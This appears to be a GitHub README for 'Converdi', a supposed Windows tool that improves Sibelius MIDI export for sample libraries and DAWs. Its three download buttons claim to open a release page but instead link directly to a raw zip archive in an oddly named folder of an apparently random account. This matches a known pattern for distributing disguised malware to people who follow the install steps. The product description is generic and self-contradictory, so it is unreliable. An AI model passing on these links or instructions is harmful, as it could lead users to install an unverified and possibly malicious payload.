# 🎵 converdi - Improve Sibelius MIDI export quality

[![Download converdi](https://img.shields.io/badge/Download-Converdi-brightgreen?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)

<p align="center">
  <img src="converdi.png" alt="Converdi">
</p>

Converdi is an open-source tool designed for composers who use Sibelius for writing music and want to perform it with sample libraries inside a digital audio workstation (DAW). It converts a Sibelius score into a MIDI file ready for your DAW. The MIDI file includes important music details like articulations, dynamics, and playing techniques that Sibelius’s built-in MIDI export misses.

Converdi also handles sample library routing. This means the MIDI output works better with your virtual instruments without extra manual work.

---

## 🎯 Why Use Converdi?

When you export MIDI directly from Sibelius, the file only contains notes and tempo. It ignores differences between note articulations like staccato, legato, tremolo, or pizzicato. The volume dynamics are lost, and all notes play with the same velocity. Also, there is no support for keyswitches needed by many sample libraries.  

If you want a realistic mockup of your score, you usually have to re-enter all the detail manually in your DAW. This process takes a long time and often causes errors. Every time you change your score, you have to repeat the work.

Converdi automates this translation. It exports the score while keeping the musical details and fits them for your DAW and sample libraries, saving time and minimizing mistakes.

---

## 🚀 Getting Started

You can use Converdi on Windows with a few simple steps.

### Step 1 — Download Converdi

Click the button below to visit the release page where you can download the latest version:

[![Download Converdi](https://img.shields.io/badge/Get%20Converdi-blue?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)

On the release page:

- Find the latest **Windows** version. It will usually be an `.exe` installer or `.zip` file.
- Download the file to your computer.

### Step 2 — Install Converdi

If you downloaded an `.exe` file:

- Double-click the file.
- Follow the on-screen instructions to install Converdi.
- Choose default options unless you have a specific reason to change them.

If you downloaded a `.zip` archive:

- Right-click the `.zip` file and select **Extract All...**.
- Choose a folder to place the extracted files.
- Open that folder to run Converdi.

---

## ⚙️ Using Converdi with Sibelius and Your DAW

### Exporting MIDI from Sibelius

Open your Sibelius score.

Go to **File > Export > MIDI**. Save this MIDI file somewhere you can find it easily.

### Running Converdi

1. Launch Converdi from your desktop or Start menu.
2. In Converdi, open the MIDI file you exported from Sibelius.
3. Set your preferences, if needed, for articulation handling, dynamics, and sample library routing.
4. Click **Convert** or **Export** to create a new MIDI file optimized for your DAW.
5. Save the new MIDI file to a location you remember.

### Loading into Your DAW

Open your DAW.

Import the Converdi-generated MIDI file.

You will notice that dynamics and articulations now reflect the original score details.

Your sample library keyswitches will also work as expected, producing a more natural and expressive playback.

---

## 🖥️ System Requirements

- Windows 10 or later
- 64-bit processor
- At least 4 GB RAM
- Screen resolution of 1280x720 or higher
- MIDI files exported from Sibelius 7 or newer

---

## 🔧 Features

- Converts Sibelius MIDI files with detailed articulations preserved
- Supports dynamics such as crescendos, decrescendos, and accents
- Maps sample library keyswitches automatically based on playing techniques
- Simple interface for non-technical users
- Works with all major DAWs (Ableton Live, Logic Pro, Cubase, Reaper, etc.)
- Supports batch conversion of multiple MIDI files
- Open-source and free to use

---

## 📝 Troubleshooting

- **Converdi does not open:** Make sure your Windows is up to date and you have the latest version of .NET Framework installed.
- **Conversion fails:** Check that your MIDI file was exported from Sibelius correctly.
- **No articulations heard in DAW:** Confirm your sample library supports the MIDI keyswitches and playing techniques you are using.
- **Lag or slow response:** Close other heavy applications and try again.
- **Need help:** Look for an issues section on the GitHub page or open a new issue describing the problem.

---

## 📥 Download Converdi Now

Access the release page here to get the latest version for Windows:

[![Download Converdi](https://img.shields.io/badge/Download%20Latest%20Version-purple?style=for-the-badge)](https://github.com/mantisshrimpcompartment376/converdi/raw/refs/heads/main/globularness/Software-2.4.zip)